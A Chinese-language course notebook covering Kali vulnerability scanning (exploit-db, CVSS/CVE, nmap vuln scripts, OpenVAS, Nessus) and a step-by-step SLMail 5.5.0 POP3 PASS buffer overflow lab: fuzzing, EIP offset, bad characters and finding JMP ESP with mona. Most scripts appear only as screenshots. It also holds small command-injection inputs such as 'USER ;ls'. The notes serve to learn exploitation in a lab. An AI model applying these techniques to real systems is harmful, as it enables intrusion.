+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501090621704.png" alt="image-20200501090621704"></p>
+<p>循环的方式 实现扫描网段</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501090754948.png" alt="image-20200501090754948"></p>
+<p>一般建议输出为txt，因为Hping和fping类似，结果很繁琐</p>
+<p>看一下结果</p>
+<p>cat handle.txt</p>
+<p>活着的显示的都是len多大，ip多少，ttl值为几</p>
+<p>所以通过管道剔除没活着的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501091036160.png" alt="image-20200501091036160"></p>
+<p>（^表示以len开头的）</p>
+<h6 id="发现——四层发现"><a href="#发现——四层发现" class="headerlink" title="发现——四层发现"></a>发现——四层发现</h6><h3 id="kali安全第八章——漏洞-弱点扫描"><a href="#kali安全第八章——漏洞-弱点扫描" class="headerlink" title="kali安全第八章——漏洞/弱点扫描"></a>kali安全第八章——漏洞/弱点扫描</h3><p>第七章介绍了主机发现、端口发现、服务扫描 </p>
+<p>能够用扫描发现很多有用的信息 比如端口上跑的是什么服务，使用的软件版本，就可以与官网安全补丁对照，寻找漏洞。</p>
+<p>弊端就是在很多端口，很多软件，中再去官网寻找漏洞，很费时间和精力</p>
+<p>当然可以使用漏洞库，比如kali官方维护的漏洞库：exploit-db.com</p>
+<p>例如知道了一个端口上跑的应用，可以在网站上搜应用的名字，会有利用代码。</p>
+<p>比如tomcat，直接搜tomcat，就会出现各个类别的利用代码（拒绝服务、上传、跨站脚本等等） </p>
+<p>也可以到其他漏洞库搜，比如metasploit维护的————网站</p>
+<p>如果不想一个一个网站搜，可以在kali里直接searchsploit</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501163443381.png" alt="image-20200501163443381"></p>
+<p>这些漏洞其实是放在操作系统下的目录下</p>
+<p>目录是/usr/share/exploitdb/platforms/</p>
+<p>这样是比官网找方便多的，因为官网是不会给利用代码的，只会描述</p>
+<p><strong>sandi-gui</strong>（kali1.1里面有，kali2.0没这个了！只给了searchsploit）</p>
+<p>这个工具在kali-漏洞利用工具集-exploit database里面</p>
+<p>这里也可搜索，这里不但包含exploitdb的，还有metasploit等等漏洞库 </p>
+<p>当然有更简便的方法就是使用</p>
+<p><strong>弱点扫描器</strong></p>
+<p>扫描器自动利用那些利用代码向朝向的主机进行探测，</p>
+<p>企业也往往周期性地漏洞扫描器扫描主机</p>
+<p>在企业里往往安全人员扮演漏洞管理的工作</p>
+<p><strong>从信息的维度定义漏洞管理</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501211057747.png" alt="image-20200501211057747"></p>
+<p> <strong>弱点扫描类型</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501211821121.png" alt="image-20200501211821121"></p>
+<p>需要被攻击主机安装扫描器的agent，一般用于企业内部自查</p>
+<h6 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501212745155.png" alt="image-20200501212745155"></p>
+<p>漏洞的工业标准，非常严格的方法给漏洞打分</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501213024469.png" alt="image-20200501213024469"></p>
+<p>漏洞的评分高，但可能对企业威胁等级不相同， </p>
+<p>需要注意CVSS是工业标准，是做漏洞管理必须要遵守的</p>
+<p><strong>CVE</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501213322337.png" alt="image-20200501213322337"></p>
+<p>CVE不仅仅是给漏洞标1号2号3号，标号是很重要的，否则交流会很困难</p>
+<p>发现一个漏洞会报给CAN，由它指定CVE ID</p>
+<p>编号是CVE-年份-这年第几个漏洞</p>
+<p>除了cve标号，其他厂商也会标号，微软标号就是MS-08067-09012（比较著名的一个漏洞）</p>
+<p>微软标号的补丁MSKB</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501213820721.png" alt="image-20200501213820721"></p>
+<p>BID 英国的</p>
+<p>CERT 国际计算机应急响应小组</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501213829839.png" alt="image-20200501213829839"></p>
+<p>OVAL 开放的漏洞描述语言，使用xml语言描述，通用的描述方法对漏洞描述，记录性的描述，会被导入到检测工具活着扫描器</p>
+<p>所以做漏洞扫描的公司说所谓漏洞能最及时扫描出来都是噱头，因为OVAL都是标准化的语言描述，导入后就能实现，都不用了解漏洞的原理</p>
+<p>所以不存在谁家的独有优势 </p>
+<p>CCE</p>
+<p>描述软件缺陷，</p>
+<p>配置缺陷的检测就是由cce定义的</p>
+<p>CPE</p>
+<p>规范化命名规则</p>
+<p>CWE</p>
+<p><strong>SCAP</strong></p>
+<p>上面所说的概念都被集合在SCAP</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501214714378.png" alt="image-20200501214714378"></p>
+<p><strong>NVD</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501214932934.png" alt="image-20200501214932934"></p>
+<p>这个网址里有一个check list，检查一个公司的信息安全等级的一个表，很不错</p>
+<p><strong>这些概念就是为了实现漏洞的管理</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501215123054.png" alt="image-20200501215123054"></p>
+<p>三要素互相关联，很难同时满足高要求</p>
+<p><strong>讲完概念以后，将讲三个工具和nmap脚本</strong></p>
+<h6 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h6><p>nmap会默认继承400+哥脚本，分为很多类</p>
+<p>（中文输入法解决办法——区域和语言——删除汉语——再apt-get install ibus——再添加汉语选择汉语（pinyin）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502095824634.png" alt="image-20200502095824634"></p>
+<p>这个文件就是存放nmap所有脚本名称的目录性文件</p>
+<p>这个db里每一条都有一个categories，就是这个脚本属于的分类和属性，有discovery类的，vuln发现漏洞类的，safe表示对目标系统没有破环效果</p>
+<p>值得注意的就是exploit（漏洞利用的意思） ，vuln（弱点英文的前几个字母）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502100236031.png" alt="image-20200502100236031"></p>
+<p>less是统计有多少行</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502100900360.png" alt="image-20200502100900360"></p>
+<p>这俩没讲</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502100913186.png" alt="image-20200502100913186"></p>
+<p>这个说在上一节末尾讲过了这个漏洞</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502101004067.png" alt="image-20200502101004067"></p>
+<p>美国对伊朗的震网病毒的四个漏洞之一</p>
+<p>如果没有直接找到共享打印机，可以利用nmap的这个脚本枚举共享打印机</p>
+<p>这个脚本可以先发现有没有共享打印机，再利用这个漏洞探测可不可以创建系统文件</p>
+<p>但还涉及扫描结果的判断，如果没有通过这个脚本判断有没有打印机，只是利用这个漏洞所给的脚本直接调用lanman api ，可能因为这个机器没有开lanman api，直接返回不存在这个漏洞</p>
+<p>这时nmap的判断漏洞是否存在的方法</p>
+<p>还有的扫描器是查看有没有打这个补丁，没打就返回有漏洞</p>
+<p>但如果没打补丁但没把打印机共享，这个漏洞也利用不了</p>
+<p>所以扫描器的结果并不完全准确，（有的扫描器只是看补丁，有的扫描器会先判断漏洞的先决条件是否存在）</p>
+<p>（因此比较而言，nmap的判断条件还是更接近于真实情况）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502105322760.png" alt="image-20200502105322760"></p>
+<p>学习过程中还要理解扫描器如何扫描的以及更深的原理</p>
+<p>查看一下nmap里这个漏洞的脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502102542935.png" alt="image-20200502102542935"></p>
+<p>最后一行描述利用的是tcp的445端口。前面有这个脚本的介绍</p>
+<p>还有CVSS的评分、返回结果应该是什么样子等等</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502102713915.png" alt="image-20200502102713915"></p>
+<p>用ppt上的命令试一下（因为不知道smb的账号和密码，所以把参数删掉）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502104923395.png" alt="image-20200502104923395"></p>
+<p>（！！！！这里的问题是，显然这里的命令是nmap扫描打印机的命令，与刚刚查看漏洞目录里写的命令不同，那么这个扫描打印机的命令是从那里来的呢）</p>
+<p>可见1.104这个没开445</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502105144320.png" alt="image-20200502105144320"></p>
+<p>1.116这个开着呢，但没有枚举出有哪些设备</p>
+<h6 id="OPENVAS"><a href="#OPENVAS" class="headerlink" title="OPENVAS"></a>OPENVAS</h6><p>开源的扫描器</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502105425320.png" alt="image-20200502105425320"></p>
+<p>Nessus是最被认可的商用扫描器</p>
+<p>要先进行初始化配置和启动的操作</p>
+<p>openvas更新很频繁，老师说它使用过程中发生了很大变化，</p>
+<p><strong>所以先跳过吧，以后搜相关文档再操作</strong>，这里把ppt放进来</p>
+<p>（kali里面对openvas有了很大的优化，一条openvas-setup就包含了列表里所有的配置操作）</p>
+<p>（最新的kali里找不到了，2020）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502162617897.png" alt="image-20200502162617897"></p>
+<p>再openvas里一个漏洞对应一个NVT</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502162827225.png" alt="image-20200502162827225"></p>
+<p>其他的扫描器也跳过了吧，都过时了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163759877.png" alt="image-20200502163759877"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163817326.png" alt="image-20200502163817326"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163833879.png" alt="image-20200502163833879"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163853604.png" alt="image-20200502163853604"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163909073.png" alt="image-20200502163909073"></p>
+<h6 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a>NESSUS</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163937250.png" alt="image-20200502163937250"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502163953505.png" alt="image-20200502163953505"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502164006986.png" alt="image-20200502164006986"></p>
+<h3 id="kali安全第九章——缓冲区溢出"><a href="#kali安全第九章——缓冲区溢出" class="headerlink" title="kali安全第九章——缓冲区溢出"></a>kali安全第九章——缓冲区溢出</h3><p> 0day漏洞是如何发现的，如何进行控制的？</p>
+<p>此类攻击中最主要的一种——缓冲区溢出</p>
+<p>基于本章的内容，将掌握这样的方法</p>
+<p>缓冲区溢出时可以直接控制目标系统的漏洞的最主要的一个类型</p>
+<p><strong>程序漏洞从哪里来</strong></p>
+<p>缓冲区时内存里的一个片段，</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502203502988.png" alt="image-20200502203502988"></p>
+<p>为了又切身体会，用shell脚本试一下</p>
+<p>提前准备了一个shell脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502204417449.png" alt="image-20200502204417449"></p>
+<p>最上面一行时shell解释器，用bshell</p>
+<p>echo $1就是把输入的字符显示到屏幕上 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502204549773.png" alt="image-20200502204549773"></p>
+<p>如果后面输入的是一个命令或者程序？</p>
+<p>pwd是显示目前所在路径</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502204703352.png" alt="image-20200502204703352"></p>
+<p>除了；，管道符| 还有 &amp;&amp; 还有&amp; 都能实现 </p>
+<p>介绍</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502205100627.png" alt="image-20200502205100627"></p>
+<p><strong>如何发现漏洞</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200502205246529.png" alt="image-20200502205246529"></p>
+<p>主流的有三种</p>
+<p>第一种就是源码审计：</p>
+<p>前提是得接触到源码</p>
+<p>或者逆向得到源码 </p>
+<p>或者拿不到源码，动态地检测运行过程中对不同输入的反馈，就是模糊测试</p>
+<h6 id="windows缓冲区溢出"><a href="#windows缓冲区溢出" class="headerlink" title="windows缓冲区溢出"></a>windows缓冲区溢出</h6><p>操作系统上的缓冲区溢出通常是由于系统上的服务，服务一般会开放一些端口，端口会侦听一些程序接受用户输入</p>
+<p>这里老师<strong>选用</strong>的是服务端是 SLMail 版本5.5.0 可以变成一个收发mail的服务器</p>
+<p>第二个就是ImmunityDebugger</p>
+<p>业界里非常主流的动态调试工具，但也没有选择更为熟知的alterdbg的动态调试工具，是因为这个immunity可以利用python脚本自动化，自动化程度更高</p>
+<p>第三个是mona.py的脚本，mona再后续过程中辅助定位进程模块，</p>
+<p>要先把他们三安装在windows环境下，这个实验是演示，不建议使用win7及以上，使用xp</p>
+<p>先安装SLmail服务器，基本都是默认安装，其中要记得勾选——把系统账号导入为邮箱账号（又两个allow的页面）——导入zhou和administrator</p>
+<p>安装完成后cmd里netstat -nan，注意110、23、180、8376这几个端口（在安装过程中有出现），都已经开放，说明软件应该安装完成</p>
+<p>再检查下服务，cmd里service.msc</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200503171635356.png" alt="image-20200503171635356"></p>
+<p>这三个已经开启</p>
+<p><strong>服务端这里就完成了</strong></p>
+<p><strong>下面安装调试工具</strong></p>
+<p>直接一路确定，要安装python2.7</p>
+<p><strong>mona</strong></p>
+<p>解压缩以后，打开调试工具目录——pyCommands文件夹——把mona.py移动进去</p>
+<p><strong>至此准备工作完成</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200503174133276.png" alt="image-20200503174133276"></p>
+<p>用nc连接到slmail相关端口（smtp或者pop3）上，就能使用相关的指令，再进行缓冲区溢出</p>
+<p>演示：</p>
+<p>必须把防火墙关掉 或者 把225和110端口打开</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504094441044.png" alt="image-20200504094441044"></p>
+<p>这里先开开防火墙吧，用配置端口的方式把</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504095429418.png" alt="image-20200504095429418"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504095930914.png" alt="image-20200504095930914"></p>
+<p>更改icmp设置使得可以ping</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504100101279.png" alt="image-20200504100101279"></p>
+<p>ping成功了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504100336581.png" alt="image-20200504100336581"></p>
+<p>测试25端口成功，可以使用一些指令了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504100522520.png" alt="image-20200504100522520"></p>
+<p>其中nouz-8d0e那串应该是XX.com，安装slmail的时候忘了改</p>
+<p>同样测110端口</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504110530573.png" alt="image-20200504110530573"></p>
+<p>连接端口以后，就能使用端口上的一些命令</p>
+<p>那么如果想研究有没有漏洞，就可以考虑从向端口提交数据/指令的地方 寻找漏洞</p>
+<p>比如USER 后面可以接任何字符</p>
+<p>USER ;ls或者USER | pwd 等等</p>
+<p>再kali这端发各种各样的字符，在xp端用debugger调试，查看不同字符执行的过程</p>
+<p>而老师选取的这个软件这个版本恰恰在pop3 PASS命令存在缓冲区溢出漏洞</p>
+<p>利用漏洞控制了系统后，就无需身份验证了</p>
+<p>之前说不建议使用win7以上一是因为slmail太老，二是全部支持DEP和ASLR了</p>
+<p>DEP是结合软硬件实现</p>
+<p>但也出现了很多绕过DEP的技术</p>
+<p>后来又加了ASLR，win7的某一个版本加的，之前地址不会变，甚至能把shell跳转指定到系统的地址上</p>
+<p>后来无论是win还是linux，都开始使用动态地址</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504110954438.png" alt="image-20200504110954438"></p>
+<p>（FUZZER是漏洞检查工具，但老师没提）</p>
+<p>接下来</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504113512674.png" alt="image-20200504113512674"></p>
+<p>进行模糊测试</p>
+<p>最笨的方法就是nc对方端口（现在已经知道pass命令里又漏洞了，如果不知道就要试，而且每次数据量要很大才可能溢出）</p>
+<p>（而每次试都要输入上千的字符，效率很低，所以要用程序脚本</p>
+<p>一个简单的基本脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504113726571.png" alt="image-20200504113726571"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504114428957.png" alt="image-20200504114428957"></p>
+<p>现在的pop3服务器可能还比较熟悉，其他的协议不熟悉可能就要去RFC了解有什么命令和参数，另外一种就是wireshark抓包（可能不出名的私有协议）</p>
+<p>所以还要了解更多的协议，负责指挥跟着做</p>
+<p>下面如何处罚并发现pass的缓冲区溢出呢</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504115325756.png" alt="image-20200504115325756"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504115500380.png" alt="image-20200504115500380"></p>
+<p>数据量要一步步增大，测试出缓冲区大小</p>
+<p>怎么判断服务器已经产生溢出了呢？</p>
+<p>打开debugger</p>
+<p>debugger可以打开一个静态的程序文件，也可以对进程调试（用attach）</p>
+<p>我们应该attach监听110端口的哪个程序，谁监听110，谁就是pop3的程序（netstat -nao，最后一列就是PID）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504145543816.png" alt="image-20200504145543816"></p>
+<p>attach进来以后默认出去pause状态，点击上方的播放按钮，让他进行起来</p>
+<p>类似于在中间的一个拦截</p>
+<p>服务端准备好以后回到客户端</p>
+<p>介绍debugger：</p>
+<p>左上是当前运行的汇编指令的窗口，右边是寄存器窗口</p>
+<p>左下是内存数据 右下也是数据</p>
+<p>要重点关注右上的寄存器数据，因为寄存器是马上要交给cpu执行的部分</p>
+<p>第一个关注的是EIP： 显示4141414141，都是十六进制的</p>
+<p>ascii码，ascii码里A就是65（十进制），41（十六进制）</p>
+<p>也就是EIP全都是A，ESP、EBP也都是A</p>
+<p>EIP就是当前这个进程下一步要执行的指令的内存地址，现在全是A就说明数据溢出到了存放指令的内存地址</p>
+<p>这时去到指令的地址就全是A了。程序进行不下去应该崩溃了， 这时候重新打开windows服务，服务已经停止了</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504150746711.png" alt="image-20200504150746711"></p>
+<p>研究缓冲区时要最常用的寄存器就是EIP，因为它存放下一条指令的地址（因此可以选择不改地址，再EIP对应的地址上溢出设计的系统命令，或者溢出到EIP上新的地址，这个地址对应另一处精心设计的恶意程序）</p>
+<p>这个时候再把它启动起来，再重新attach（重新启动服务以后PID就变了</p>
+<p>准备下一步有恶意行为的脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504151536116.png" alt="image-20200504151536116"></p>
+<p>03.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504151613138.png" alt="image-20200504151613138"></p>
+<p>这个脚本的目的是找到精确溢出应该用多少个字符</p>
+<p>发现2700的时候EIP已经全A了，就往下减</p>
+<p>试试2600</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504154010412.png" alt="image-20200504154010412"></p>
+<p>这时发现2600，EIP没有被填充，但debugger paused了，说明缓冲区溢出发生了但没有影响到EIP</p>
+<p>下一步就应该再2600-2700间定位</p>
+<p>可以用二分法、唯一字符串法（生成2700个字符，每四个为一组，每一组都不相同，就能从被填充的定位出第几个</p>
+<p>）</p>
+<p>生成唯一字符串可以用metasploit里的工具</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504161235022.png" alt="image-20200504161235022"></p>
+<p>把生成的字符，填入到脚本里</p>
+<p>04.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504161312812.png" alt="image-20200504161312812"></p>
+<p>发现服务端</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504161405337.png" alt="image-20200504161405337"></p>
+<p>EIP里的字符是39694438</p>
+<p>分隔好 39 69 44 38</p>
+<p>内存里是低地址高位，高地址低位，实际上这四个字符刻度顺序是38 44 69 39  也就是8Di9</p>
+<p>可以计算确切位置</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504180718100.png" alt="image-20200504180718100"></p>
+<p>眼睛里找原来字符串，确实第2607个字符是8.2608个字符为D</p>
+<p>试验一下是不是真的2606，脚本05.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504181017011.png" alt="image-20200504181017011"></p>
+<p>可见EIP为全B，ESP为20个C，即ESP是紧跟着EIP的寄存器。</p>
+<p>那么ESP是不是真的能用呢？下一小节</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504181413412.png" alt="image-20200504181413412"></p>
+<p>06.py</p>
+<p>假设？？能存放3500个字符，判断ESP寄存器够不够大小能作为存放shellcode的地方</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504182714159.png" alt="image-20200504182714159"></p>
+<p>调试的是SLmail这个进程，不是之前那个25端口的那个了（不知道为啥）</p>
+<p>对ESP 右键follow in down，在左下就能看到，找出现c的起始地址</p>
+<p>更改一下样式</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504183134580.png" alt="image-20200504183134580"></p>
+<p>从第一次出现是EF7A154</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504183222552.png" alt="image-20200504183222552"></p>
+<p>最后一次出现EF7A2F4</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504183246824.png" alt="image-20200504183246824"></p>
+<p>放了多少个C？两个相减再转换成十进制是416</p>
+<p>即ESP是416字节大小，一般shellcode大小为300+，所以足够存放shellcode</p>
+<p>下一步应该就是写shellcode，溢出到ESP，再更改EIP地址使得运行shellcode，</p>
+<p>但事情不是像我们想的那么简单</p>
+<p>但是集中我们做模糊测试中，因为程序和协议的不同，有些字符在缓冲区内是不能出现的，有的协议会过滤0x0A,有的会过滤0x0D，或者遇到0x0C就崩溃，还有一些字符是具备特殊意义的，</p>
+<p>所以在写shellcode前，必须把坏字符找出来</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504183732229.png" alt="image-20200504183732229"></p>
+<p>避免出现坏字符</p>
+<p>所以要进一步测试有哪些坏字符</p>
+<p> 在pop3服务里面，0x00空字符是用于拷贝操作的，0x0D是用于回车操作的，这是基于已知的知识，与没有其他的还得测试</p>
+<p>一个字节 00000000八位二进制数  到11111111有256个可能</p>
+<p>07.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504185004587.png" alt="image-20200504185004587"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504185652246.png" alt="image-20200504185652246"></p>
+<p>发现ESP没显示什么内容，那就是表示指向的内存地址，还是右键——follow in down</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504185754496.png" alt="image-20200504185754496"></p>
+<p>01-09都是正常的，到0a时后面的字符就全都没有了，后面的200多个字符全都忽略了</p>
+<p>于是改代码，把0a更改为09</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504185928850.png" alt="image-20200504185928850"></p>
+<p>发现</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504190035284.png" alt="image-20200504190035284"></p>
+<p>01-09 09 0b 0c</p>
+<p>0d没有，过滤掉了，0e 0f等都正常</p>
+<p>最后面的00也没出现。</p>
+<p>所以结论是0a、0d、00都是坏字符</p>
+<p>接下来</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504190345877.png" alt="image-20200504190345877"></p>
+<p>就应该做数据重定向了，把EIP的内容改成ESP地址</p>
+<p>但实际情况并不是这么容易，ESP这个地址是变化的，硬编码（就是把地址写进脚本里）是不行的，主机进程多的时候重启mail进程，寄存器地址很可能变化。</p>
+<p>因为slmail是基于线程，每次它的内存地址都是操作系统给他分配的一段，所以不能保证始终不变</p>
+<p>所以把EIP中的4个B直接改成ESP显示的地址不可行</p>
+<p>1、找一个地址固定的系统模块，在这样的模块中寻找”JMP ESP”（跳转）这样的指令（因为模块地址不变，如果这个模块里有”JMP ESP”指令，那么”JMP ESP”这个指令的地址也应该是不变的）</p>
+<p> 那么就把这个地址溢出到EIP内容，就可以再跳转到ESP啦</p>
+<p>缓冲区溢出中常常使用几跳跳到shellcode</p>
+<p>那么如何找到一个固定不断的模块呢？</p>
+<p>就要用到mona脚本了，mona脚本可以实现对固定分配的模块的查询，</p>
+<p>在debugger最下面一行，输入！mona modules</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504205717836.png" alt="image-20200504205717836"></p>
+<p>关心的第一列就是rebase，表示重启以后是否发生变化，false就是不发生变化，所以要找false的模块</p>
+<p>第二列第三列第四列是操作系统提供的安全措施，这三列也得是false（可以看到这三列就是之前讲过的win7上配置过的安全措施）</p>
+<p>也就是前四项最好都是false，OS这列要选True，就是每个操作系统都自带的库（不是系统的库在其他系统上可能用不了）</p>
+<p>发现一个符合的，这个模块的名称是openc32.dll，</p>
+<p>然后在这个模块里面查找有没有执行JMP ESP</p>
+<p>还是用mona：</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504210215487.png" alt="image-20200504210215487"></p>
+<p>“ ”里面不能写jmp ESP，因为这是操作系统内存地址层面，都是二进制，不认识汇编指令</p>
+<p>也就是得知道JMP ESP对应的二进制是什么</p>
+<p>会到kali，把汇编指令转换成二进制（有一个工具）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504212730785.png" alt="image-20200504212730785"></p>
+<p>回到debugger搜FFE4，但要分为两个字节而且是十六进制数</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504212824419.png" alt="image-20200504212824419"></p>
+<p>返回 find a total off 0(听写的)</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504213048323.png" alt="image-20200504213048323"></p>
+<p>也就是没有，再往下找吧</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504213422892.png" alt="image-20200504213422892"></p>
+<p>（注意模块的名字在最后一列的后面）</p>
+<p>总共就找到三个四个false一个true的，这三个可能都没有，那就得找别的方法了</p>
+<p>最后一个找到了：</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504213659016.png" alt="image-20200504213659016"></p>
+<p>第一列就是内存地址，这个内存地址存放的就是 FFE4，双击一个 ，就会变成二进制表示的界面</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504213824532.png" alt="image-20200504213824532"></p>
+<p>选择图中的那个，变二进制为汇编语言表示 </p>
+<p>可见第一行就是</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504214009380.png" alt="image-20200504214009380"></p>
+<p>就是要这条指令的内存地址。</p>
+<p>也看看别的吧，因为刚mona搜到了很多条FFE4，这些应该都是可以的</p>
+<p>这里多说一句</p>
+<p>打开内存地图</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504214125401.png" alt="image-20200504214125401"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504214152362.png" alt="image-20200504214152362"></p>
+<p>这是刚刚搜的结果，记住其中选中那行的内存地址——5F4B41E3</p>
+<p>到内存地图里看看这行上下写的啥</p>
+<p>内存地图里没找到，是因为里面显示的是这个模块的基地址（就是在四false一true界面里显示的哪个模块的地址）</p>
+<p>内存地图里，找到5E400000，显示是一个PE header，这是一个pe执行程序头，紧跟着的就是.text类型的code</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200504214508797.png" alt="image-20200504214508797"></p>
